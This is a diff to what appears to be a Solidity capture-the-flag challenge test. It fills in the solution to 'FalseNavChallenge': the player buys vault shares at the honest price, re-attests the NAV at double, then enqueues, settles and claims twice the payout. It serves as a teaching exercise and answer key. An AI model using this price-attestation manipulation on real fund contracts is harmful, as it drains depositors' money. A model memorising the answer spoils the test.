@@ -109,7 +109,16 @@ contract FalseNavChallenge is Test {
         // Remember the queue: to be paid you must first subscribe (for shares), enqueue those
         // shares to lock a payout at today's NAV, and then settle and claim.
         //
-        // TODO: your code goes here
+        // Buy at the honest price, then double the redemption quote.
+        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
+        vault.subscribe(INITIAL_PLAYER_BALANCE);
+        vault.attest(int256(2e8));
+        tBill.approve(address(queue), 1_000e18);
+        queue.enqueue(1_000e18);
+        queue.settle(2_000e6);
+        queue.claim();
+        assertEq(usdc.balanceOf(player), 2_000e6);
+        assertEq(tBill.balanceOf(alice), 1_000e18);
     }
 
     ////////////////////////////////////////////////////////////////////////
